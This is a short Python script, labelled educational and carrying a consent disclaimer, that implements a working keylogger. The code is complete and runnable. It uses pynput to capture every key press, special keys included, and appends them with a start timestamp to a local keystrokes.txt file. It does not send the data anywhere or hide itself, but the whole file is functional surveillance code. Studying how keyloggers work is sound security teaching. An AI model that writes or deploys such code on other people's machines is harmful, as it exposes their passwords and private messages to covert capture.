"""
Educational Keylogger Script
Author: Your Name
Purpose: Educational use only to understand how keyloggers work.
DISCLAIMER: Do NOT use this on other people’s systems without consent.
"""


from pynput import keyboard
import os
from datetime import datetime

# Step 1: Create logs directory if it doesn't exist
log_dir = "../logs"
os.makedirs(log_dir, exist_ok=True)  # Create the logs folder if it doesn't exist

# Step 2: Define the log file path
log_file_path = os.path.join(log_dir, "keystrokes.txt")

# Step 3: Start logging with a timestamp header
with open(log_file_path, "a") as f:
    f.write("\n\n=== Keylogger Started at {} ===\n".format(datetime.now().strftime("%Y-%m-%d %H:%M:%S")))

# Step 4: Define what happens on key press
def on_press(key):
    try:
        # Try to get the character (for normal keys)
        with open(log_file_path, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        # Handle special keys (like Enter, Shift, etc.)
        with open(log_file_path, "a") as f:
            f.write(f" [{key}] ")

# Step 5: Start the keylogger listener
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
